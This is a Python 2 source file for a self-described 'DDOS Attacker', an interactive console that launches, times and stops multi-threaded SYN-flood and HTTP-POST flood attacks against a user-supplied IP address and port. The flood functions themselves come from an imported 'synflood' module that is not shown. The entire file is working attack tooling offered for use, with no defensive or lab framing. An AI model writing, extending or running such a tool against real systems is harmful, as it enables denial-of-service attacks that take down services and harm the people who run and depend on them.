import sys
import threading
import socket
import time
import Queue
from synflood import *

def getArgs(words):
    iN = words.index('-n') + 1
    int(words[iN])

    iPort = words.index('-port') + 1
    int(words[iPort])

    iIP = words.index('-ip') + 1
    socket.inet_aton(words[iIP])

    return (words[iN], words[iPort], words[iIP])

def startAttack((n, port, ip), event, attack):
    if (attack == 'syn-flood'):
        threads = n
    else:
        threads = 1

    event.set()
    queue = Queue.Queue(threads)

    for i in range(1, int(threads)+1):
        if (attack == 'syn-flood'):
            t = threading.Thread(target = synFlood, args = (i, port, ip, event,
                                                            queue))
        else:
            t = threading.Thread(target = httpPost, args = (0, port, ip, event,
                                                            queue, n))
        t.setDaemon(True)
        t.start()
        queue.put(i)

    print "%s attack started with %s attach units" % (attack, n)
    return queue

def stopAttack(event, queue, message):
    event.clear()
    queue.join()
    print "%s" % (message)

################################### INICIO ##################################### 
if __name__ == '__main__':
    synEvent = threading.Event()
    httpEvent = threading.Event()
    synTime = httpTime = -1
    synTimeStart = httpTimeStart = time.time()
    httpQueue = synQueue = Queue.Queue(0)
        
    print "===== Welcome to DDOS Attacker====="
    print "Please command your attack or try --help for more information"

    while 1:
        if (synTime > 0) & ((time.time() - synTimeStart) > synTime):
            print "SYN Flood attack duration was %s seconds" % (synTime)
            words = 'syn-flood -stop'
            synTime = -1
        elif (httpTime > 0) & ((time.time() - httpTimeStart) > httpTime):
            print "HTTP Post attack duration was %s seconds" % (httpTime)
            words = 'http-post -stop'
            httpTime = -1
        else:
            line = raw_input("> ")
            line = line.lower()
            words = line.split(' ')
            if len(words[0]) == 0:
                continue

        if '--help' in words:
            print "Please inform <attack type> <flags>"
            print "\nValid attack types:"
            print "    syn-flood"
            print "    http-post"
            print "\n Compulsory flags to begin an attack:"
            print "    -port <[int] destination port>"
            print "    -ip <[ipv4] destination ip>"
            print "    -n <[int] number of attacking units>"
            print "\n Necessary flags:"
            print "    -start"
            print " or"
            print "    -stop"
            print " or"
            print "    -time <[int] attack period in seconds>"
            continue
        elif 'exit()' in words:
            break
        elif ('syn-flood' not in words) & ('http-post' not in words):
            print "Invalid command. For more information, try --help"
            continue
        elif (('-start' in words) | ('-time' in words)) & \
             (('-port' not in words) | ('-ip' not in words) |
              ('-n' not in words)):
            print "Missing compulsory flag(s). For more information, try --help"
            continue

        if '-start' in words:
            try:
                if '-time' in words:
                    i = words.index('-time') + 1
                    if 'syn-flood' in words:
                        synTime = int(words[i])
                        synTimeStart = time.time()
                    else:
                        httpTime = int(words[i])
                        httpTimeStart = time.time()
     
                args = getArgs(words)
                if 'syn-flood' in words:
                    synQueue = startAttack(args, synEvent, 'syn-flood')
                else:
                    httpQueue = startAttack(args, httpEvent, 'http-post')
            except ValueError:
                print "Invalid flag(s). For more information, try --help"
                continue
        elif '-stop' in words:
            if ('syn-flood' in words) & (synEvent.is_set()):
                stopAttack(synEvent, synQueue, "SYN Flood stopped")
            else:
                stopAttack(httpEvent, httpQueue, "HTTP Post stopped")
        else:
            print "Missing necessary flag. For more information, try --help"

